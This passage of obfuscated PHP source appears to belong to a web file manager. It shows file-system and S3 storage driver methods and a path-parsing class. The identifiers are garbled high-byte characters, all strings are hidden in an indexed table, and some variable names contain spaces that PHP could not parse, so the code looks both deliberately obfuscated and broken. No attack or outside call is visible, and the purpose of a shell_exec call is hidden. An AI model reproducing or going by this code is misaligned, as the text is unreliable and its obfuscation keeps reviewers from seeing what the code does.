closedir($¿·‘ïô–); return rmdir($¬û½Ø¿÷); } public function rename($Â§Šİ¾, $‹Â”›¹ú) { $ˆõ·çâú =& $_SERVER[óÔë„ú]; $û±úàç™ = $this->fileNameAuto($this->pathFather($Â§Šİ¾), $‹Â”›¹ú); $û±úàç™ = $this->iconvSystem($û±úàç™); $Â§Šİ¾ = $this->iconvSystem($Â§Šİ¾); $ã¢ Î¯ = $this->pathFather($Â§Šİ¾); $‘ÈşÊŸõ = rtrim($ã¢ Î¯, $ˆõ·çâú[8]) . $ˆõ·çâú[8] . $û±úàç™; $Í‰Æ·µ = @rename($Â§Šİ¾, $‘ÈşÊŸõ); $‘ÈşÊŸõ = $this->iconvApp($‘ÈşÊŸõ); if ($Í‰Æ·µ) { return $this->getPathOuter($‘ÈşÊŸõ); } $this->writeLog(__FUNCTION__ . $ˆõ·çâú[1435], !0); return !1; } public function size($…“Ÿğı) { $…“Ÿğı = $this->iconvSystem($…“Ÿğı); return filesize_64($…“Ÿğı); } public function info($›¤Ó’…) { $›¤Ó’… = $this->iconvSystem($›¤Ó’…); if ($this->isFolder($›¤Ó’…)) { return $this->folderInfo($›¤Ó’…); } else { if ($this->isFile($›¤Ó’…)) { return $this->fileInfo($›¤Ó’…); } } return !1; } protected function infoChildren($îÂËîêñ, &$“Œöç, $üø¹´·Ï = true) { $¶°“ø§‰ =& $_SERVER[óÔë„ú]; check_abort_echo(); $îÂËîêñ = rtrim($îÂËîêñ, $¶°“ø§‰[8]) . $¶°“ø§‰[8]; if ($üø¹´·Ï) { $îÂËîêñ = $this->iconvSystem($îÂËîêñ); } if (!($­Ş‰«à´ = @opendir($îÂËîêñ))) { return; } while (($‡ŒŞÕí = readdir($­Ş‰«à´)) !== !1) { if ($‡ŒŞÕí == $¶°“ø§‰[10] || $‡ŒŞÕí == $¶°“ø§‰[1350]) { continue; } $“ÏªùŞÍ = $îÂËîêñ . $‡ŒŞÕí; if (is_file($“ÏªùŞÍ) || is_link($“ÏªùŞÍ)) { $“Œöç[$¶°“ø§‰[80]]++; $“Œöç[$¶°“ø§‰[79]] += filesize_64($“ÏªùŞÍ); } else { if (is_dir($“ÏªùŞÍ)) { $“Œöç[$¶°“ø§‰[81]]++; $this->infoChildren($“ÏªùŞÍ, $“Œöç, !1); } } } closedir($­Ş‰«à´); } private function folderInfo($§ª×ÔÇ, $á–´Ö££ = false) { $¬´ã®Ğ =& $_SERVER[óÔë„ú]; $§ª×ÔÇ = rtrim($§ª×ÔÇ, $¬´ã®Ğ[8]) . $¬´ã®Ğ[8]; $ûèß¨Ò = $this->iconvApp($this->pathThis($§ª×ÔÇ)); if ($á–´Ö££) { return array($¬´ã®Ğ[32] => $ûèß¨Ò, $¬´ã®Ğ[87] => $this->getPathOuter($§ª×ÔÇ), $¬´ã®Ğ[33] => $¬´ã®Ğ[78]); } $ÎÉÀ”Ä = array($¬´ã®Ğ[32] => $ûèß¨Ò, $¬´ã®Ğ[87] => $this->getPathOuter($§ª×ÔÇ), $¬´ã®Ğ[33] => $¬´ã®Ğ[78], $¬´ã®Ğ[231] => @filectime($§ª×ÔÇ), $¬´ã®Ğ[88] => @filemtime($§ª×ÔÇ), $¬´ã®Ğ[1439] => @fileatime($§ª×ÔÇ), $¬´ã®Ğ[1440] => is_readable($§ª×ÔÇ), $¬´ã®Ğ[1441] => is_writable($§ª×ÔÇ), $¬´ã®Ğ[1442] => get_mode($§ª×ÔÇ)); return $ÎÉÀ”Ä; } private function fileInfo($´±Ø«ï‚, $´Á·ê†· = false) { $İ˜ßşÍƒ =& $_SERVER[óÔë„ú]; $äàõªŒö = $this->iconvApp($this->pathThis($´±Ø«ï‚)); if ($´Á·ê†·) { return array($İ˜ßşÍƒ[32] => $äàõªŒö, $İ˜ßşÍƒ[87] => $this->getPathOuter($´±Ø«ï‚), $İ˜ßşÍƒ[33] => $İ˜ßşÍƒ[230], $İ˜ßşÍƒ[79] => $this->size($´±Ø«ï‚), $İ˜ßşÍƒ[169] => $this->ext($äàõªŒö)); } $òÙ¸Ò¤ƒ = array($İ˜ßşÍƒ[32] => $äàõªŒö, $İ˜ßşÍƒ[87] => $this->getPathOuter($´±Ø«ï‚), $İ˜ßşÍƒ[33] => $İ˜ßşÍƒ[230], $İ˜ßşÍƒ[231] => @filectime($´±Ø«ï‚), $İ˜ßşÍƒ[88] => @filemtime($´±Ø«ï‚), $İ˜ßşÍƒ[1439] => @fileatime($´±Ø«ï‚), $İ˜ßşÍƒ[79] => $this->size($´±Ø«ï‚), $İ˜ßşÍƒ[169] => $this->ext($äàõªŒö), $İ˜ßşÍƒ[1440] => is_readable($´±Ø«ï‚), $İ˜ßşÍƒ[1441] => is_writable($´±Ø«ï‚), $İ˜ßşÍƒ[1442] => get_mode($´±Ø«ï‚)); return $òÙ¸Ò¤ƒ; } public function exist($Çàš›îÒ) { $Çàš›îÒ = $this->iconvSystem($Çàš›îÒ); return @file_exists($Çàš›îÒ); } public function isFile($Ìë‹Ã—) { $Ìë‹Ã— = $this->iconvSystem($Ìë‹Ã—); return @is_file($Ìë‹Ã—); } public function isFolder($¸ŸĞ“È¥) { $¸ŸĞ“È¥ = $this->iconvSystem($¸ŸĞ“È¥); return @is_dir($¸ŸĞ“È¥); } public function listPath($×ÇØ·Î…, $éÖ¦ÀÃÖ = false) { $€Ô±“¶„ =& $_SERVER[óÔë„ú]; $×ÇØ·Î… = $this->iconvSystem($×ÇØ·Î…); $×ÇØ·Î… = rtrim($×ÇØ·Î…, $€Ô±“¶„[8]) . $€Ô±“¶„[8]; $­¢½¤Ş = array($€Ô±“¶„[85] => array(), $€Ô±“¶„[86] => array()); if (!($İÖ½âÖó = @opendir($×ÇØ·Î…))) { return $­¢½¤Ş; } while (($”åŠæüã = readdir($İÖ½âÖó)) !== !1) { if ($”åŠæüã == $€Ô±“¶„[10] || $”åŠæüã == $€Ô±“¶„[1350]) { continue; } $¯ñîëÂĞ = $×ÇØ·Î… . $”åŠæüã; if (is_file($¯ñîëÂĞ)) { $­¢½¤Ş[$€Ô±“¶„[86]][] = $this->fileInfo($¯ñîëÂĞ, $éÖ¦ÀÃÖ); } else { $­¢½¤Ş[$€Ô±“¶„[85]][] = $this->folderInfo($¯ñîëÂĞ, $éÖ¦ÀÃÖ); } } closedir($İÖ½âÖó); return $­¢½¤Ş; } public function listAll($¿¥‡Ã‘‘, &$à¡ø¿×· = array()) { $Œ¯Ô·îœ =& $_SERVER[óÔë„ú]; $¿¥‡Ã‘‘ = $this->iconvSystem($¿¥‡Ã‘‘); $¿¥‡Ã‘‘ = rtrim($¿¥‡Ã‘‘, $Œ¯Ô·îœ[8]) . $Œ¯Ô·îœ[8]; if (!($””ÙÏõ¡ = @opendir($¿¥‡Ã‘‘))) { return $à¡ø¿×·; } while (($™¿³ÇÏë = readdir($””ÙÏõ¡)) !== !1) { if ($™¿³ÇÏë == $Œ¯Ô·îœ[10] || $™¿³ÇÏë == $Œ¯Ô·îœ[1350]) { continue; } $îËæ¿Åë = $¿¥‡Ã‘‘ . $™¿³ÇÏë; $üÎ® Ï¤ = is_dir($îËæ¿Åë) && !is_link($îËæ¿Åë) ? 1 : 0; $îËæ¿Åë = $üÎ® Ï¤ ? $îËæ¿Åë . $Œ¯Ô·îœ[8] : $îËæ¿Åë; $à¡ø¿×·[] = array($Œ¯Ô·îœ[87] => $îËæ¿Åë, $Œ¯Ô·îœ[78] => $üÎ® Ï¤, $Œ¯Ô·îœ[88] => intval(@filemtime($îËæ¿Åë)), $Œ¯Ô·îœ[79] => $üÎ® Ï¤ ? 0 : intval($this->size($îËæ¿Åë))); if ($üÎ® Ï¤) { $this->listAll($îËæ¿Åë, $à¡ø¿×·); } } closedir($””ÙÏõ¡); return $à¡ø¿×·; } public function has($¤×Âµ¥, $¶»ª¡§ì = false, $¤…ğŠŞ™ = true) { $Ïû ¹¬Î =& $_SERVER[óÔë„ú]; $¤×Âµ¥ = $this->iconvSystem($¤×Âµ¥); $¤×Âµ¥ = rtrim($¤×Âµ¥, $Ïû ¹¬Î[8]) . $Ïû ¹¬Î[8]; if (!($º’Ø™Å¤ = @opendir($¤×Âµ¥))) { return !1; } $üÃ¨¨÷ü = 0; $œßñÏ¼Ş = 0; $¸ë’…ş¶ = 0; while (($£´ú¥ÎÅ = readdir($º’Ø™Å¤)) !== !1) { if ($£´ú¥ÎÅ == $Ïû ¹¬Î[10] || $£´ú¥ÎÅ == $Ïû ¹¬Î[1350]) { continue; } $óãÊàÖ = $¤×Âµ¥ . $£´ú¥ÎÅ; if ($¶»ª¡§ì) { $¸ë’…ş¶++; if (@is_file($óãÊàÖ)) { $üÃ¨¨÷ü++; } else { $œßñÏ¼Ş++; } if ($¸ë’…ş¶ > 10000) { break; } continue; } if ($¤…ğŠŞ™) { if (@is_file($óãÊàÖ)) { return !0; } } else { if (@is_dir($óãÊàÖ . $Ïû ¹¬Î[8])) { return !0; } } } closedir($º’Ø™Å¤); if ($¶»ª¡§ì) { return array($Ïû ¹¬Î[239] => $üÃ¨¨÷ü, $Ïû ¹¬Î[240] => $œßñÏ¼Ş); } return !1; } public function hashSimple($‡ê¥¶“Š) { $…Å‘ù·È =& $_SERVER[óÔë„ú]; if (!$‡ê¥¶“Š) { return md5($…Å‘ù·È[12]); } $‡ê¥¶“Š = $this->iconvSystem($‡ê¥¶“Š); $„Ü‡ûÎ = $this->size($‡ê¥¶“Š); $Ö™¼öà = 200; $±Š…©¦ = 50; if ($„Ü‡ûÎ <= $Ö™¼öà * $±Š…©¦) { return $this->hashMd5($‡ê¥¶“Š) . $„Ü‡ûÎ; } $“ŞÈ¡öì = $…Å‘ù·È[12]; $‘äÎÒ– = intval($„Ü‡ûÎ / $±Š…©¦); $™ì»¾Ò = fopen($‡ê¥¶“Š, $…Å‘ù·È[1443]); if (!$™ì»¾Ò) { return $“ŞÈ¡öì; } for ($¤×ˆí¤‹ = 0; $¤×ˆí¤‹ < $±Š…©¦; $¤×ˆí¤‹++) { fseek_64($™ì»¾Ò, $‘äÎÒ– * $¤×ˆí¤‹); $“ŞÈ¡öì .= fread($™ì»¾Ò, $Ö™¼öà); } fseek_64($™ì»¾Ò, $„Ü‡ûÎ - $Ö™¼öà); $“ŞÈ¡öì .= fread($™ì»¾Ò, $Ö™¼öà); fclose($™ì»¾Ò); return md5($“ŞÈ¡öì) . $„Ü‡ûÎ; } public function getContent($®™Ä¯Òğ) { $®™Ä¯Òğ = $this->iconvSystem($®™Ä¯Òğ); return file_get_contents($®™Ä¯Òğ); } public function setContent($§„¹ãŠ, $âÃÁ…ğé = '') { $§„¹ãŠ = $this->iconvSystem($§„¹ãŠ); $âÕ³Ù¹Â = @file_put_contents($§„¹ãŠ, $âÃÁ…ğé, LOCK_EX); if (!$âÕ³Ù¹Â) { $this->writeLog(__FUNCTION__ . $_SERVER[óÔë„ú][1435], !0); } clearstatcache(); @chmod($§„¹ãŠ, $this->pathAuth); return $âÕ³Ù¹Â === !1 ? !1 : !0; } public function fileSubstr($ìÚñ•ı, $¬¢ë±Í = 0, $¿›™º“§ = false) { $ÕÑ€åµô =& $_SERVER[óÔë„ú]; $ìÚñ•ı = $this->iconvSystem($ìÚñ•ı); if ($¿›™º“§ === !1) { $¿›™º“§ = $this->size($ìÚñ•ı); } if ($¿›™º“§ <= 0) { return $ÕÑ€åµô[12]; } $‰ÇÙ¬‘ç = fopen($ìÚñ•ı, $ÕÑ€åµô[1443]); if (!$‰ÇÙ¬‘ç) { return !1; } fseek_64($‰ÇÙ¬‘ç, $¬¢ë±Í); $½âÓÆé = fread($‰ÇÙ¬‘ç, $¿›™º“§); fclose($‰ÇÙ¬‘ç); if (!$½âÓÆé) { $this->writeLog(__FUNCTION__ . $ÕÑ€åµô[1435], !0); } return $½âÓÆé; } public function upload($Ä¹®šã›, $›•É¨ù¦, $àã™ÅÖç = false, $Íì „í = REPEAT_REPLACE) { if ($àã™ÅÖç) { return $this->moveFile($›•É¨ù¦, $Ä¹®šã›); } return $this->copyFile($›•É¨ù¦, $Ä¹®šã›); } public function setModifyTime($è“Ó×, $´Ë¸¢„Ò = '') { @touch($è“Ó×, intval($´Ë¸¢„Ò)); } public function download($ü¶¶ëÜİ, $ÇÈ¤øÉ£) { return $this->iconvSystem($ü¶¶ëÜİ); } } class PathDriverOBS extends PathDriverBaseS3 { public function __construct($™úÓ’×â) { parent::__construct($™úÓ’×â); $this->setSignVersion($_SERVER[óÔë„ú][247]); } public function fileOutImage($ñ¥Öô, $¼½õ¢É© = 250) { $¢Ã‹³¿Ù =& $_SERVER[óÔë„ú]; if ($this->size($ñ¥Öô) > 1024 * 1024 * 25) { return $this->fileOutImageServer($ñ¥Öô, $¼½õ¢É©); } $ƒ˜Ó»ĞÏ = array($¢Ã‹³¿Ù[1444] => $¢Ã‹³¿Ù[1445] . $¼½õ¢É© . $¢Ã‹³¿Ù[1446]); $ìœçï¹ = $this->link($ñ¥Öô, $ƒ˜Ó»ĞÏ); $this->fileOutLink($ìœçï¹); } public function fileOutLink($Ø­ø¼Š„) { $¢Ùšª§ =& $_SERVER[óÔë„ú]; if (substr($Ø­ø¼Š„, 0, 7) == $¢Ùšª§[313]) { $Ø­ø¼Š„ = $¢Ùšª§[314] . substr($Ø­ø¼Š„, 7); } header($¢Ùšª§[175] . $Ø­ø¼Š„); die; } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($ıà²©œ±) { parent::__construct($ıà²©œ±); $this->setSignVersion($_SERVER[óÔë„ú][247]); } public function fileOutLink($‚¬¶ù½“) { $îí™Ìî =& $_SERVER[óÔë„ú]; if (substr($‚¬¶ù½“, 0, 7) == $îí™Ìî[313]) { $‚¬¶ù½“ = $îí™Ìî[314] . substr($‚¬¶ù½“, 7); } header($îí™Ìî[175] . $‚¬¶ù½“); die; } } goto BšÎ¿ï‡¼Ã; FˆÇòÇ½Ó: class KodIO { const KOD_SOURCE = "\173\x73\157\x75\162\143\145\x7d"; const KOD_USER_RECYCLE = "\173\165\x73\145\162\x52\x65\x63\x79\143\154\x65\x7d"; const KOD_USER_FAV = "\x7b\x75\163\x65\x72\106\141\166\x7d"; const KOD_USER_FILE_TAG = "\173\x75\x73\145\162\106\x69\x6c\145\124\141\x67\x7d"; const KOD_USER_FILE_TYPE = "\173\x75\163\x65\162\x46\151\x6c\x65\124\171\160\x65\175"; const KOD_GROUP_ROOT_SELF = "\x7b\147\162\157\x75\160\x52\x6f\x6f\164\123\x65\x6c\146\175"; const KOD_USER_SHARE = "\x7b\x75\163\145\x72\x53\150\x61\x72\x65\x7d"; const KOD_USER_SHARE_LINK = "\173\165\163\145\x72\x53\150\x61\x72\145\x4c\x69\x6e\x6b\x7d"; const KOD_USER_SHARE_TO_ME = "\x7b\x73\150\141\162\145\x54\x6f\115\145\175"; const KOD_SHARE_ITEM = "\x7b\x73\x68\141\x72\145\111\164\145\155\175"; const KOD_SHARE_LINK = "\x7b\163\x68\141\162\x65\x49\164\145\155\x4c\151\156\153\x7d"; const KOD_SEARCH = "\x7b\x73\x65\x61\x72\143\x68\x7d"; const KOD_BLOCK = "\x7b\142\x6c\157\x63\x6b\x7d"; const KOD_IO = "\173\x69\157\x7d"; const KOD_USER_RECENT = "\x7b\x75\x73\145\162\122\145\156\x63\145\156\164\x7d"; const KOD_USER_DRIVER = "\x7b\x64\x72\x69\166\x65\x72\x7d"; public static function typeList() { $âöÁÉ¶Ù =& $_SERVER[óÔë„ú]; return array($âöÁÉ¶Ù[1323] => self::KOD_SOURCE, $âöÁÉ¶Ù[1324] => self::KOD_USER_RECYCLE, $âöÁÉ¶Ù[1325] => self::KOD_USER_FAV, $âöÁÉ¶Ù[1326] => self::KOD_USER_FILE_TAG, $âöÁÉ¶Ù[1327] => self::KOD_USER_FILE_TYPE, $âöÁÉ¶Ù[1328] => self::KOD_GROUP_ROOT_SELF, $âöÁÉ¶Ù[1329] => self::KOD_USER_SHARE, $âöÁÉ¶Ù[1330] => self::KOD_USER_SHARE_LINK, $âöÁÉ¶Ù[1331] => self::KOD_USER_SHARE_TO_ME, $âöÁÉ¶Ù[1332] => self::KOD_SHARE_ITEM, $âöÁÉ¶Ù[1333] => self::KOD_SHARE_LINK, $âöÁÉ¶Ù[1334] => self::KOD_SEARCH, $âöÁÉ¶Ù[1335] => self::KOD_BLOCK, $âöÁÉ¶Ù[1336] => self::KOD_IO, $âöÁÉ¶Ù[1337] => self::KOD_USER_RECENT, $âöÁÉ¶Ù[1338] => self::KOD_USER_DRIVER); } public static function parse($ìÀì¨éÃ) { $›“ææ« =& $_SERVER[óÔë„ú]; $ìÀì¨éÃ = self::clear($ìÀì¨éÃ); $öÆ­ù = array_values(self::typeList()); preg_match($›“ææ«[1339], $ìÀì¨éÃ, $îŒ©‚); $½Íû­ğ = array($›“ææ«[496] => !1, $›“ææ«[1340] => !1, $›“ææ«[493] => !1, $›“ææ«[87] => $ìÀì¨éÃ, $›“ææ«[1236] => !1, $›“ææ«[1235] => $›“ææ«[12]); if (is_array($îŒ©‚) && count($îŒ©‚) == 5) { $¯–ÃĞì‹ = $›“ææ«[1341] . $îŒ©‚[2] . $›“ææ«[403]; if (in_array($¯–ÃĞì‹, $öÆ­ù)) { $½Íû­ğ[$›“ææ«[1236]] = $îŒ©‚[1]; $½Íû­ğ[$›“ææ«[33]] = $¯–ÃĞì‹; $½Íû­ğ[$›“ææ«[1342]] = substr($¯–ÃĞì‹, 1, -1); $½Íû­ğ[$›“ææ«[475]] = $îŒ©‚[3]; } $½Íû­ğ[$›“ææ«[1235]] = $îŒ©‚[4]; } $Ö™ß½’Ñ = array($›“ææ«[12], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $½Íû­ğ[$›“ææ«[1305]] = in_array($½Íû­ğ[$›“ææ«[33]], $Ö™ß½’Ñ); return $½Íû­ğ; } public static function isTruePath($œ‘²¬–×) { $éÄâ’ø =& $_SERVER[óÔë„ú]; if (substr($œ‘²¬–×, 0, 1) != $éÄâ’ø[1341]) { return !0; } if (strpos($œ‘²¬–×, $éÄâ’ø[483]) === 0) { return !0; } if (strpos($œ‘²¬–×, $éÄâ’ø[1309]) === 0) { return !0; } if (strpos($œ‘²¬–×, $éÄâ’ø[1343]) === 0) { return !0; } if (strpos($œ‘²¬–×, $éÄâ’ø[1344]) === 0) { return !0; } if (strpos($œ‘²¬–×, $éÄâ’ø[1345]) === 0) { return !0; } return !1; } public static function clear($Û¢°çº) { $…£„©¡ =& $_SERVER[óÔë„ú]; $Û¢°çº = str_replace(array($…£„©¡[1142], $…£„©¡[262]), $…£„©¡[53], $Û¢°çº); $Û¢°çº = str_replace($…£„©¡[100], $…£„©¡[8], $Û¢°çº); $ëõí›¡• = $…£„©¡[1346]; if (substr($Û¢°çº, 0, 3) == $…£„©¡[1347]) { $Û¢°çº = substr($Û¢°çº, 3); } while (strstr($Û¢°çº, $ëõí›¡•)) { $Û¢°çº = str_replace($ëõí›¡•, $…£„©¡[8], $Û¢°çº); } $Û¢°çº = preg_replace($…£„©¡[1348], $…£„©¡[8], $Û¢°çº); if ($Û¢°çº == $…£„©¡[8]) { return $…£„©¡[8]; } $Û¢°çº = rtrim($Û¢°çº, $…£„©¡[8]); return $Û¢°çº; } public static function pathTrue($¾è¨åÀÚ) { $è—Ÿ‚ê =& $_SERVER[óÔë„ú]; if (!$¾è¨åÀÚ) { return $è—Ÿ‚ê[12]; } $¾è¨åÀÚ = str_replace($è—Ÿ‚ê[592], $è—Ÿ‚ê[8], str_replace($è—Ÿ‚ê[1349], $è—Ÿ‚ê[8], $¾è¨åÀÚ)); $¾è¨åÀÚ = str_replace($è—Ÿ‚ê[592], $è—Ÿ‚ê[8], str_replace($è—Ÿ‚ê[1349], $è—Ÿ‚ê[8], $¾è¨åÀÚ)); if (!strstr($¾è¨åÀÚ, $è—Ÿ‚ê[1347])) { return $¾è¨åÀÚ; } $‘ëå±– = explode($è—Ÿ‚ê[8], $¾è¨åÀÚ); foreach ($‘ëå±– as $‘œ‘Â¥à => $•ÙÕ»ËË) { if ($•ÙÕ»ËË !== $è—Ÿ‚ê[1350]) { continue; } for ($î°¾—ú• = $‘œ‘Â¥à; $î°¾—ú• >= 0; $î°¾—ú•--) { if ($‘ëå±–[$î°¾—ú•] === $è—Ÿ‚ê[10] || $‘ëå±–[$î°¾—ú•] === $è—Ÿ‚ê[1350] || $‘ëå±–[$î°¾—ú•] === -1) { continue; } if ($‘ëå±–[$î°¾—ú•] === $è—Ÿ‚ê[12]) { $‘ëå±–[$‘œ‘Â¥à] = -1; break; } $‘ëå±–[$‘œ‘Â¥à] = -1; $‘ëå±–[$î°¾—ú•] = -1; break; } } $ƒĞ­Œ§˜ = array(); foreach ($‘ëå±– as $•ÙÕ»ËË) { if ($•ÙÕ»ËË !== -1) { $ƒĞ­Œ§˜[] = $•ÙÕ»ËË; } } $İï­Æõö = implode($è—Ÿ‚ê[8], $ƒĞ­Œ§˜); if (strpos($İï­Æõö, $è—Ÿ‚ê[1351]) === 0) { $İï­Æõö = $è—Ÿ‚ê[1347] . substr($İï­Æõö, strlen($è—Ÿ‚ê[1351])); } return $İï­Æõö; } public static function pathUrlClear($ãÁåÁÔİ) { $€ë•÷ı =& $_SERVER[óÔë„ú]; if (!$ãÁåÁÔİ) { return $ãÁåÁÔİ; } $ãÁåÁÔİ = rawurldecode($ãÁåÁÔİ); $ãÁåÁÔİ = str_replace($€ë•÷ı[1349], $€ë•÷ı[8], $ãÁåÁÔİ); if (strpos($ãÁåÁÔİ, $€ë•÷ı[76]) > 0) { $ãÁåÁÔİ = substr($ãÁåÁÔİ, 0, strpos($ãÁåÁÔİ, $€ë•÷ı[76])); } if (strpos($ãÁåÁÔİ, $€ë•÷ı[1352]) > 0) { $ãÁåÁÔİ = substr($ãÁåÁÔİ, 0, strpos($ãÁåÁÔİ, $€ë•÷ı[1352])); } return $ãÁåÁÔİ; } public static function sourceID($•µóáŠ¨) { $ò„á€ˆ¶ =& $_SERVER[óÔë„ú]; $ãìëß‘ = self::parse($•µóáŠ¨); if ($ãìëß‘[$ò„á€ˆ¶[33]] !== self::KOD_SOURCE) { show_json(LNG($ò„á€ˆ¶[1353]), !1); } return $ãìëß‘[$ò„á€ˆ¶[475]]; } public static function make($ÃóÓÆÔ³) { if (!$ÃóÓÆÔ³) { return !1; } return self::makePath(self::KOD_SOURCE, intval($ÃóÓÆÔ³)); } public static function makeShare($äö€á é, $ºóÒ›ÈØ) { return self::makePath(self::KOD_SHARE_ITEM, $äö€á é, $ºóÒ›ÈØ); } public static function makeFileTypePath($ıôàß¹Œ) { return self::makePath(self::KOD_USER_FILE_TYPE, $ıôàß¹Œ); } public static function makeFileTagPath($ÔÊÌÔÑ) { return self::makePath(self::KOD_USER_FILE_TAG, $ÔÊÌÔÑ); } public static function makePath($å‘—Ëˆ¢, $ëÏš‡¥Ş = '', $ÀĞÃÆ”° = '') { $€Ã´šô =& $_SERVER[óÔë„ú]; $Ôğ¥€‚ = substr($å‘—Ëˆ¢, 1, -1); $ËúÃ«‚ = $€Ã´šô[1354] . $Ôğ¥€‚ . $€Ã´šô[1355] . $ëÏš‡¥Ş . $€Ã´šô[1356]; $ËúÃ«‚ = $ÀĞÃÆ”° ? $ËúÃ«‚ . $ÀĞÃÆ”° . $€Ã´šô[8] : $ËúÃ«‚; return $ËúÃ«‚; } public static function hashPath($Ñ¢Œ÷î, $Û—Æ™ºü = true) { $µ–Ì´ =& $_SERVER[óÔë„ú]; $±ºÊ¨ñÓ = is_array($Ñ¢Œ÷î) ? $Ñ¢Œ÷î : IO::info($Ñ¢Œ÷î); $Òˆí™®§ = _get($±ºÊ¨ñÓ, $µ–Ì´[1357], $µ–Ì´[12]); if (!$Òˆí™®§ && isset($±ºÊ¨ñÓ[$µ–Ì´[235]])) { $Òˆí™®§ = trim($±ºÊ¨ñÓ[$µ–Ì´[235]], $µ–Ì´[121]); } if (!$Òˆí™®§ && isset($±ºÊ¨ñÓ[$µ–Ì´[193]]) && $±ºÊ¨ñÓ[$µ–Ì´[193]]) { $±ºÊ¨ñÓ = IO::info(KodIO::make($±ºÊ¨ñÓ[$µ–Ì´[193]])); $Òˆí™®§ = _get($±ºÊ¨ñÓ, $µ–Ì´[1357], $µ–Ì´[12]); } $£ßÄ†¬ˆ = md5($±ºÊ¨ñÓ[$µ–Ì´[87]] . $±ºÊ¨ñÓ[$µ–Ì´[79]] . $±ºÊ¨ñÓ[$µ–Ì´[88]]); if (!$Òˆí™®§ && file_exists($±ºÊ¨ñÓ[$µ–Ì´[87]])) { $Òˆí™®§ = Cache::get($£ßÄ†¬ˆ . $µ–Ì´[1358]); $Òˆí™®§ = !1; if (!$Òˆí™®§) { $Òˆí™®§ = IO::hashSimple($±ºÊ¨ñÓ[$µ–Ì´[87]]); Cache::set($£ßÄ†¬ˆ . $µ–Ì´[1358], $Òˆí™®§, 3600 * 24 * 30); } } if ($Û—Æ™ºü && !$Òˆí™®§) { } return $Òˆí™®§ ? $Òˆí™®§ : $£ßÄ†¬ˆ; } public static function hashPathSafe($ŞãÄÔ¢, $ï±Õ—°Î = true) { $‰¸Âåµ =& $_SERVER[óÔë„ú]; $»ôŸŠÙê = self::hashPath($ŞãÄÔ¢, $ï±Õ—°Î); return md5($»ôŸŠÙê . $‰¸Âåµ[1359] . Model($‰¸Âåµ[830])->get($‰¸Âåµ[831])); } public static function initSystemPath() { $³ÌÒ‡Ï· =& $_SERVER[óÔë„ú]; if (defined($³ÌÒ‡Ï·[1360])) { return; } define($³ÌÒ‡Ï·[1360], self::systemPath($³ÌÒ‡Ï·[191])); define($³ÌÒ‡Ï·[1361], self::systemPath($³ÌÒ‡Ï·[1362])); define($³ÌÒ‡Ï·[1363], self::systemPath($³ÌÒ‡Ï·[1364])); define($³ÌÒ‡Ï·[1365], self::systemPath($³ÌÒ‡Ï·[1366])); IOHistory::bindEvent(); } public static function systemPath($•üš×) { $Ùœ«à”Ù =& $_SERVER[óÔë„ú]; $ã¡õõ¥ = $Ùœ«à”Ù[1367] . ucfirst($•üš×); $¸«íáæú = Model($Ùœ«à”Ù[830])->get($ã¡õõ¥); if ($¸«íáæú) { return $¸«íáæú; } if ($•üš× == $Ùœ«à”Ù[191]) { $¸«íáæú = self::make(Model($Ùœ«à”Ù[884])->systemRootPathAdd($Ùœ«à”Ù[605])); } else { $¸«íáæú = self::systemPath($Ùœ«à”Ù[191]); $ÃÄ—¢² = self::sourceID($¸«íáæú); $¸«íáæú = self::make(Model($Ùœ«à”Ù[884])->mkdir($ÃÄ—¢², $•üš×)); } Model($Ùœ«à”Ù[830])->set($ã¡õõ¥, $¸«íáæú); return $¸«íáæú; } public static function systemFolder($ËÑŸÔšæ) { $Ìòğ©âµ = IO_PATH_SYSTEM_SOURCE . $ËÑŸÔšæ; $à„Š¨ñ˜ = Cache::get($Ìòğ©âµ); if (!$à„Š¨ñ˜) { $¬ÎÊı¡ = IO::infoFullSimple($Ìòğ©âµ); if (!$¬ÎÊı¡) { $à„Š¨ñ˜ = IO::mkdir($Ìòğ©âµ, REPEAT_SKIP); } else { $à„Š¨ñ˜ = $¬ÎÊı¡[$_SERVER[óÔë„ú][87]]; } Cache::set($Ìòğ©âµ, $à„Š¨ñ˜, 3600 * 10); } return $à„Š¨ñ˜; } public static function defaultDriver() { return Model($_SERVER[óÔë„ú][827])->defaultDriver(); } public static function defaultIO() { $èæ¨êøÇ =& $_SERVER[óÔë„ú]; $ÖÕ¼øÎÔ = self::defaultDriver(); return $èæ¨êøÇ[1368] . $ÖÕ¼øÎÔ[$èæ¨êøÇ[475]] . $èæ¨êøÇ[1356]; } public static function defaultDriverInit() { static $íâöÍäÌ = false; if ($íâöÍäÌ) { return $íâöÍäÌ; } $íâöÍäÌ = IO::init(self::defaultIO()); return $íâöÍäÌ; } public static function fileTypeList() { $óäş£“Ñ =& $_SERVER[óÔë„ú]; $¦ş•–Í¹ = $GLOBALS[$óäş£“Ñ[6]][$óäş£“Ñ[1369]]; foreach ($¦ş•–Í¹ as $ÉåõÒ¨ => $íõûñ—‡) { $¹£ëñ = $óäş£“Ñ[1370] . $ÉåõÒ¨; $ÌÅ¸áÉ = LNG($¹£ëñ); if ($¹£ëñ != $ÌÅ¸áÉ) { $¦ş•–Í¹[$ÉåõÒ¨][$óäş£“Ñ[32]] = $ÌÅ¸áÉ; } } return $¦ş•–Í¹; } public static function diskList($ÃÙÒÉé = true) { $÷âÀâ×¤ = $_SERVER[óÔë„ú][1371]; if ($ÃÙÒÉé) { $éÄ«ø§Ú = Cache::get($÷âÀâ×¤); if (is_array($éÄ«ø§Ú)) { return $éÄ«ø§Ú; } } $éÄ«ø§Ú = self::diskListGet(); Cache::set($÷âÀâ×¤, $éÄ«ø§Ú, 60); return $éÄ«ø§Ú; } public static function diskListGet() { $· ¯Ö¸ö =& $_SERVER[óÔë„ú]; $äŞßá’ = array(); if ($GLOBALS[$· ¯Ö¸ö[6]][$· ¯Ö¸ö[1372]] == $· ¯Ö¸ö[1373]) { $ÀúùíÏ² = $· ¯Ö¸ö[1374]; for ($â¯ø¬‰ó = 0; $â¯ø¬‰ó < strlen($ÀúùíÏ²); $â¯ø¬‰ó++) { $£åèø« = $ÀúùíÏ²[$â¯ø¬‰ó] . $· ¯Ö¸ö[1375]; if (file_exists($£åèø«)) { $äŞßá’[] = $£åèø«; } } return $äŞßá’; } if (!function_exists($· ¯Ö¸ö[101])) { $äŞßá’[] = $· ¯Ö¸ö[895]; return $äŞßá’; } $èŠšËµ¥ = explode($· ¯Ö¸ö[262], shell_exec($· ¯Ö¸ö[1376])); array_shift($èŠšËµ¥); array_pop($èŠšËµ¥); 